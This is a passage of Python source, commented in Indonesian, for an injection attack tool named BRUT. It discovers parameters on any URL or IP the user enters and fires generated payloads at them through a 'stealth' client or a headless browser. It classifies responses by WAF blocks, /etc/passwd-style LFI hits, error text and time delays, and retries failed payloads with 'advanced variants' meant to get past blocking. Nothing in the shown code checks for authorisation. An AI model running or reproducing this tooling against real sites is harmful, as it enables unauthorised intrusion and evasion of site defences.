        r"your\s+request\s+has\s+been\s+blocked",
        r"firewall", r"protected\s+by",
    ]

    # Pola konten /etc/passwd (indikasi LFI sukses)
    LFI_SUCCESS_PATTERNS = [
        r"root:[x*]:0:0:", r"daemon:", r"bin:",
        r"nobody:", r"www-data:",
    ]

    def __init__(self):
        self.server_patterns = [re.compile(p, re.I) for p in self.SERVER_ERROR_PATTERNS]
        self.waf_patterns = [re.compile(p, re.I) for p in self.WAF_BLOCK_PATTERNS]
        self.lfi_patterns = [re.compile(p, re.I) for p in self.LFI_SUCCESS_PATTERNS]

    def analyze(self, response_text: str, status_code: int,
                response_time: float, original_response: str = None) -> Tuple[str, str, bool]:
        """
        Analisis response.
        Return: (response_type, evidence, success)
            response_type: "server_output" | "raw_html" | "blocked"
        """
        text = response_text or ""

        # 1. Cek apakah diblokir WAF
        for pattern in self.waf_patterns:
            match = pattern.search(text)
            if match:
                return ("blocked", f"WAF block: {match.group(0)[:50]}", False)

        # Status code block
        if status_code in [403, 406, 429, 503]:
            return ("blocked", f"Status {status_code}", False)

        # 2. Cek LFI success (prioritas)
        for pattern in self.lfi_patterns:
            match = pattern.search(text)
            if match:
                return ("server_output", f"LFI success: {match.group(0)[:50]}", True)

        # 3. Cek server error output
        for pattern in self.server_patterns:
            match = pattern.search(text)
            if match:
                return ("server_output",
                        f"Server error: {match.group(0)[:80]}",
                        True)

        # 4. Cek time-based (jika delay signifikan)
        if response_time > 4500:  # > 4.5 detik
            return ("server_output",
                    f"Time-based delay: {response_time:.0f}ms",
                    True)

        # 5. Cek stack trace / debug
        if re.search(r"(?i)stack\s*trace|call\s*stack|backtrace", text):
            return ("server_output", "Stack trace detected", True)

        # 6. Default: raw HTML (tidak ada indikasi server merespon error)
        return ("raw_html", "Normal HTML response", False)


# ============================================================
# INJECTOR
# ============================================================
class Injector:
    """Inject payloads ke parameter dengan stealth."""

    def __init__(self, target: str):
        self.target = target
        self.client = get_stealth_client()
        self.analyzer = ResponseAnalyzer()
        self.browser = None

    def _init_browser(self):
        """Inisialisasi Playwright browser untuk JS-rendered forms."""
        if self.browser or not HAS_PLAYWRIGHT:
            return
        try:
            self._pw = sync_playwright().start()
            self.browser = self._pw.chromium.launch(headless=True)
        except Exception as e:
            print(f"  \033[31m[!]\033[0m Playwright gagal: {e}")
            self.browser = None

    def _close_browser(self):
        if self.browser:
            try:
                self.browser.close()
                self._pw.stop()
            except:
                pass

    def inject(self, param: Parameter, payload_dict: Dict,
               use_browser: bool = False) -> Optional[InjectionResult]:
        """Inject satu payload ke satu parameter."""
        payload = payload_dict["payload"]
        result = None

        try:
            start_time = time.time()

            if use_browser and param.location == "form_input":
                response_text, status, resp_time, resp_size = self._inject_browser(param, payload)
            else:
                response_text, status, resp_time, resp_size = self._inject_http(param, payload)

            elapsed_ms = (time.time() - start_time) * 1000
            if resp_time > 0:
                elapsed_ms = resp_time

            # Analisis response
            resp_type, evidence, success = self.analyzer.analyze(
                response_text, status, elapsed_ms
            )

            result = InjectionResult(
                payload_id=payload_dict["id"],
                payload=payload,
                category=payload_dict["category"],
                parameter=param.name,
                url=param.url,
                method=param.method,
                status_code=status,
                response_time_ms=elapsed_ms,
                response_size=resp_size,
                response_type=resp_type,
                evidence=evidence,
                success=success,
                timestamp=datetime.now().isoformat(),
            )

        except Exception as e:
            # Gagal inject = blocked
            result = InjectionResult(
                payload_id=payload_dict["id"],
                payload=payload,
                category=payload_dict["category"],
                parameter=param.name,
                url=param.url,
                method=param.method,
                status_code=0,
                response_time_ms=0,
                response_size=0,
                response_type="blocked",
                evidence=f"Connection error: {str(e)[:100]}",
                success=False,
                timestamp=datetime.now().isoformat(),
            )

        return result

    def _inject_http(self, param: Parameter, payload: str) -> Tuple[str, int, float, int]:
        """Inject via HTTP (httpx/requests)."""
        start = time.time()
        response_text = ""
        status = 0
        resp_size = 0

        try:
            if self.client:
                if param.method == "GET":
                    resp = self.client.get(
                        param.url,
                        params={param.name: payload},
                        timeout=20,
                    )
                else:
                    resp = self.client.post(
                        param.url,
                        data={param.name: payload},
                        timeout=20,
                    )
                response_text = resp.text
                status = resp.status_code
                resp_size = len(resp.content)
            elif HAS_REQUESTS:
                headers = {"User-Agent": random.choice(STEALTH_HEADERS)}
                if param.method == "GET":
                    resp = requests.get(
                        param.url, params={param.name: payload},
                        headers=headers, timeout=20, verify=False
                    )
                else:
                    resp = requests.post(
                        param.url, data={param.name: payload},
                        headers=headers, timeout=20, verify=False
                    )
                response_text = resp.text
                status = resp.status_code
                resp_size = len(resp.content)

            resp_time = (time.time() - start) * 1000
            return response_text, status, resp_time, resp_size

        except Exception as e:
            resp_time = (time.time() - start) * 1000
            return "", 0, resp_time, 0

    def _inject_browser(self, param: Parameter, payload: str) -> Tuple[str, int, float, int]:
        """Inject via Playwright (untuk form JS-rendered)."""
        if not self.browser:
            self._init_browser()
        if not self.browser:
            return self._inject_http(param, payload)

        start = time.time()
        try:
            page = self.browser.new_page()
            page.goto(param.url, timeout=15000)
            time.sleep(1)

            # Cari input dan isi
            selectors = [
                f'input[name="{param.name}"]',
                f'textarea[name="{param.name}"]',
                f'select[name="{param.name}"]',
                f'#{param.name}',
            ]

            filled = False
            for sel in selectors:
                try:
                    elem = page.query_selector(sel)
                    if elem:
                        elem.fill(payload)
                        filled = True
                        break
                except:
                    continue

            # Submit form
            if filled:
                try:
                    page.click('button[type="submit"], input[type="submit"]')
                    page.wait_for_load_state("networkidle", timeout=5000)
                except:
                    pass

            time.sleep(1)
            response_text = page.content()
            resp_size = len(response_text)
            resp_time = (time.time() - start) * 1000
            page.close()

            return response_text, 200, resp_time, resp_size

        except Exception:
            resp_time = (time.time() - start) * 1000
            return "", 0, resp_time, 0

    def close(self):
        self._close_browser()


# ============================================================
# REPORT SAVER
# ============================================================
class ReportSaver:
    """Save hasil ke TXT dan JSON."""

    def __init__(self, target: str, output_dir: str = "./brut_results"):
        self.target = target
        self.parsed = urlparse(target)
        self.domain = self.parsed.netloc or self.parsed.path
        # Bersihkan nama domain
        self.domain_clean = re.sub(r'[^a-zA-Z0-9.-]', '_', self.domain)
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def save(self, results: List[InjectionResult], payloads: List[Dict]) -> Tuple[str, str]:
        """Save ke TXT dan JSON. Return (txt_path, json_path)."""
        now = datetime.now()
        year = now.strftime("%Y")
        month = now.strftime("%m")
        day = now.strftime("%d")

        # Nama file: list-payload-for-NAMA_WEB-YYYY/MM/DD
        folder_name = f"list-payload-for-{self.domain_clean}-{year}"
        folder_path = os.path.join(self.output_dir, folder_name)
        os.makedirs(folder_path, exist_ok=True)

        base_name = f"{month}_{day}"
        txt_path = os.path.join(folder_path, f"{base_name}.txt")
        json_path = os.path.join(folder_path, f"{base_name}.json")

        # Kelompokkan results
        server_response = [r for r in results if r.response_type == "server_output"]
        raw_html = [r for r in results if r.response_type == "raw_html"]
        blocked = [r for r in results if r.response_type == "blocked"]

        # === TXT FILE ===
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("=" * 80 + "\n")
            f.write(f"  BRUT PAYLOAD INJECTION REPORT\n")
            f.write(f"  Target    : {self.target}\n")
            f.write(f"  Domain    : {self.domain}\n")
            f.write(f"  Date      : {now.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"  Total     : {len(results)} payloads tested\n")
            f.write("=" * 80 + "\n\n")

            # 1. Server Response (BERHASIL)
            f.write("=" * 80 + "\n")
            f.write(f"[✓] PAYLOAD BERHASIL (Server Output, Bukan Raw HTML)\n")
            f.write(f"    Jumlah: {len(server_response)}\n")
            f.write("=" * 80 + "\n\n")

            for i, r in enumerate(server_response, 1):
                f.write(f"--- #{i} ---\n")
                f.write(f"  ID        : {r.payload_id}\n")
                f.write(f"  Category  : {r.category}\n")
                f.write(f"  Parameter : {r.parameter}\n")
                f.write(f"  URL       : {r.url}\n")
                f.write(f"  Method    : {r.method}\n")
                f.write(f"  Status    : {r.status_code}\n")
                f.write(f"  Time      : {r.response_time_ms:.0f}ms\n")
                f.write(f"  Evidence  : {r.evidence}\n")
                f.write(f"  Payload   : {r.payload[:200]}\n")
                f.write("\n")

            # 2. Raw HTML Response
            f.write("\n" + "=" * 80 + "\n")
            f.write(f"[~] PAYLOAD RESPON RAW HTML (Tidak Trigger Server Error)\n")
            f.write(f"    Jumlah: {len(raw_html)}\n")
            f.write("=" * 80 + "\n\n")

            for i, r in enumerate(raw_html, 1):
                f.write(f"--- #{i} ---\n")
                f.write(f"  ID        : {r.payload_id}\n")
                f.write(f"  Category  : {r.category}\n")
                f.write(f"  Parameter : {r.parameter}\n")
                f.write(f"  Status    : {r.status_code}\n")
                f.write(f"  Payload   : {r.payload[:150]}\n")
                f.write("\n")

            # 3. Blocked
            f.write("\n" + "=" * 80 + "\n")
            f.write(f"[✗] PAYLOAD DIBLOKIR (Terdeteksi Keamanan / No Response)\n")
            f.write(f"    Jumlah: {len(blocked)}\n")
            f.write("=" * 80 + "\n\n")

            for i, r in enumerate(blocked, 1):
                f.write(f"--- #{i} ---\n")
                f.write(f"  ID        : {r.payload_id}\n")
                f.write(f"  Category  : {r.category}\n")
                f.write(f"  Parameter : {r.parameter}\n")
                f.write(f"  Status    : {r.status_code}\n")
                f.write(f"  Evidence  : {r.evidence}\n")
                f.write(f"  Payload   : {r.payload[:150]}\n")
                f.write("\n")

            # Footer
            f.write("\n" + "=" * 80 + "\n")
            f.write("END OF REPORT\n")
            f.write("=" * 80 + "\n")

        # === JSON FILE ===
        json_data = {
            "meta": {
                "target": self.target,
                "domain": self.domain,
                "timestamp": now.isoformat(),
                "total_payloads": len(results),
                "server_response_count": len(server_response),
                "raw_html_count": len(raw_html),
                "blocked_count": len(blocked),
            },
            "server_response": [r.to_dict() for r in server_response],
            "raw_html": [r.to_dict() for r in raw_html],
            "blocked": [r.to_dict() for r in blocked],
            "all_payloads": payloads,
        }

        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)

        return txt_path, json_path


# ============================================================
# MAIN PIPELINE
# ============================================================
class BRUTPipeline:
    """Main pipeline orchestration."""

    def __init__(self, target: str):
        self.target = target
        self.parameters: List[Parameter] = []
        self.payloads: List[Dict] = []
        self.results: List[InjectionResult] = []
        self.generator = MLPayloadGenerator()
        self.injector = Injector(target)
        self.saver = ReportSaver(target)

    def phase1_discover(self) -> List[Parameter]:
        """Phase 1: Parameter discovery."""
        discovery = ParameterDiscovery(self.target)
        self.parameters = discovery.run()
        return self.parameters

    def phase2_generate(self, count: int, waf_info: Dict = None) -> List[Dict]:
        """Phase 2: Generate payloads."""
        if count <= 0:
            return []
        self.payloads = self.generator.generate(count, waf_info)
        return self.payloads

    def phase3_inject(self, max_mode: bool = False) -> List[InjectionResult]:
        """
        Phase 3: Inject payloads ke parameter.
        max_mode: berhenti saat temukan server_response yang sukses.
        """
        self.results = []
        total = len(self.payloads) * len(self.parameters)
        tested = 0
        found_server_response = False

        print(f"\n\033[36m[*]\033[0m Starting injection: "
              f"{len(self.payloads)} payloads × {len(self.parameters)} parameters")
        print(f"    Total tests: {total}")
        print(f"    Mode: {'MAX (stop on success)' if max_mode else 'NORMAL'}\n")

        # Inject sequential
        for param in self.parameters:
            if max_mode and found_server_response:
                break

            for payload_dict in self.payloads:
                tested += 1
                result = self.injector.inject(param, payload_dict)

                if result:
                    self.results.append(result)

                    # Visual feedback
                    if result.success:
                        print(f"  \033[1;32m[✓]\033[0m [{result.payload_id}] "
                              f"{result.category:<6} → {result.parameter:<15} "
                              f"| {result.evidence[:50]}")
                        found_server_response = True
                        if max_mode:
                            break
                    elif result.response_type == "raw_html":
                        if tested % 10 == 0:
                            print(f"  \033[37m[~]\033[0m [{tested}/{total}] "
                                  f"{result.category:<6} → raw HTML")
                    else:
                        if tested % 10 == 0:
                            print(f"  \033[31m[✗]\033[0m [{tested}/{total}] "
                                  f"{result.category:<6} → blocked")

                # Rate limit
                time.sleep(random.uniform(0.1, 0.3))

        return self.results

    def phase3_advanced_retry(self) -> List[InjectionResult]:
        """Jika response tidak memuaskan, generate payload lebih advanced."""
        failed = [r for r in self.results
                  if r.response_type in ["raw_html", "blocked"]]
        if not failed:
            return []

        print(f"\n\033[33m[*]\033[0m Generating advanced variants from {len(failed)} failed...")

        # Convert results back ke payload dict format
        failed_dicts = [{
            "id": r.payload_id,
            "category": r.category,
            "payload": r.payload,
        } for r in failed]

        advanced_payloads = self.generator.generate_advanced_batch(failed_dicts)

        print(f"    Generated {len(advanced_payloads)} advanced variants")

        # Inject advanced payloads
        advanced_results = []
        for param in self.parameters:
            for payload_dict in advanced_payloads:
                result = self.injector.inject(param, payload_dict)
                if result:
                    advanced_results.append(result)
                    if result.success:
                        print(f"  \033[1;32m[✓✓]\033[0m ADVANCED: "
                              f"{result.evidence[:60]}")

        self.results.extend(advanced_results)
        return advanced_results

    def phase4_save(self) -> Tuple[str, str]:
        """Phase 4: Save report."""
        return self.saver.save(self.results, self.payloads)

    def print_summary(self):
        """Print summary hasil."""
        server = [r for r in self.results if r.response_type == "server_output"]
        raw = [r for r in self.results if r.response_type == "raw_html"]
        blocked = [r for r in self.results if r.response_type == "blocked"]

        print(f"\n\033[1;36m{'='*60}")
        print(f"  INJECTION SUMMARY")
        print(f"{'='*60}\033[0m")
        print(f"  Total payloads tested : {len(self.results)}")
        print(f"  \033[32m✓ Server output (BERHASIL)\033[0m: {len(server)}")
        print(f"  \033[37m~ Raw HTML response  \033[0m : {len(raw)}")
        print(f"  \033[31m✗ Blocked/no response\033[0m : {len(blocked)}")

        if server:
            print(f"\n  \033[1;32mTop successful payloads:\033[0m")
            for r in server[:5]:
                print(f"    • [{r.payload_id}] {r.category} → {r.evidence[:60]}")


# ============================================================
# INTERACTIVE MAIN LOOP
# ============================================================
def interactive_main():
    """Main interactive loop."""
    print_banner()

    while True:
        print(f"\n\033[1;33m{'─'*60}\033[0m")
        print(f"  \033[1;37mTarget Input\033[0m  (link / domain / URL / IP)")
        print(f"  Ketik \033[31m/exit\033[0m untuk keluar")
        print(f"\033[1;33m{'─'*60}\033[0m")

        try:
            target = input(f"\n  \033[1;36mBRUT\033[0m \033[33m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n\n\033[31m[*]\033[0m Exiting...")
            break

        if not target:
            continue

        if target.lower() in ["/exit", "exit", "/quit", "quit"]:
            print(f"\n\033[31m[*]\033[0m Exiting BRUT. Goodbye!")
            break

        # Normalisasi target
        if not target.startswith(("http://", "https://")):
            target = "http://" + target

        # Validasi URL
        parsed = urlparse(target)
        if not parsed.netloc:
            print(f"  \033[31m[!]\033[0m Target tidak valid: {target}")
            continue

        # ====== PIPELINE ======
        pipeline = BRUTPipeline(target)

        # Phase 1: Parameter Discovery
        params = pipeline.phase1_discover()

        if not params:
            print(f"\n  \033[31m[!]\033[0m Tidak ada parameter yang ditemukan di {target}")
            continue

        # Tampilkan hasil discovery
        print(f"\n\033[1;32m{'='*60}")
        print(f"  PARAMETER DISCOVERY RESULTS")
        print(f"{'='*60}\033[0m")
        print(f"  Total parameter ditemukan: \033[1;37m{len(params)}\033[0m\n")

        # Kelompokkan by location
        by_location = defaultdict(list)
        for p in params:
            by_location[p.location].append(p)

        for loc, p_list in by_location.items():
            print(f"  \033[36m[{loc.upper()}]\033[0m ({len(p_list)})")
            for p in p_list[:5]:
                print(f"    • \033[37m{p.name:<25}\033[0m [{p.method}] {p.url[:60]}")
            if len(p_list) > 5:
                print(f"    ... dan {len(p_list)-5} lainnya")
            print()

        # Konfirmasi lanjut
        try:
            confirm = input(f"  \033[1;33mLanjut ke tahap injection? [Y/N] >> \033[0m").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break

        if confirm not in ["y", "yes", "ya", ""]:
            print(f"  \033[33m[*]\033[0m Dibatalkan.")
            continue

        # Phase 2: Input jumlah payload
        print(f"\n\033[1;33m{'─'*60}\033[0m")
        print(f"  \033[1;37mJumlah Payload Variant\033[0m")
        print(f"  • Angka (contoh: 100, 1000, 5000)")
        print(f"  • \033[35mmax\033[0m = unlimited, berhenti saat temukan success")
        print(f"\033[1;33m{'─'*60}\033[0m")

        try:
            count_input = input(f"\n  \033[1;36mBRUT\033[0m \033[33m>> \033[0m").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break

        max_mode = False
        if count_input == "max":
            max_mode = True
            payload_count = 500  # Default untuk max mode per iteration
            print(f"  \033[35m[*]\033[0m MAX mode aktif — berhenti saat sukses")
        else:
            try:
                payload_count = int(count_input)
                if payload_count <= 0:
                    raise ValueError
            except ValueError:
                print(f"  \033[31m[!]\033[0m Input tidak valid, gunakan angka atau 'max'")
                continue

        # Generate payloads
        print(f"\n\033[36m[*]\033[0m Generating {payload_count} payload variants dari nol...")
        payloads = pipeline.phase2_generate(payload_count)
        print(f"  \033[32m[+]\033[0m Generated {len(payloads)} unique payloads")

        # Stats
        by_cat = Counter(p["category"] for p in payloads)
        by_tier = Counter(p["length_tier"] for p in payloads)
        print(f"  By category: {dict(by_cat)}")
        print(f"  By tier    : {dict(by_tier)}")

        # Phase 3: Injection
        pipeline.phase3_inject(max_mode=max_mode)

        # Phase 3.5: Advanced retry jika tidak ada success
        success_count = len([r for r in pipeline.results if r.response_type == "server_output"])

        if success_count == 0 and not max_mode:
            print(f"\n\033[33m[*]\033[0m Tidak ada success response, mencoba advanced variants...")
            pipeline.phase3_advanced_retry()

        # Phase 4: Save
        txt_path, json_path = pipeline.phase4_save()

        # Summary
        pipeline.print_summary()

        print(f"\n  \033[32m[+]\033[0m Report saved:")
        print(f"      TXT : {txt_path}")
        print(f"      JSON: {json_path}")

        # Cleanup
        pipeline.injector.close()


# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == "__main__":
    try:
        interactive_main()
    except KeyboardInterrupt:
        print(f"\n\n\033[31m[*]\033[0m Interrupted by user. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[31m[FATAL]\033[0m {e}")
        traceback.print_exc()
        sys.exit(1)
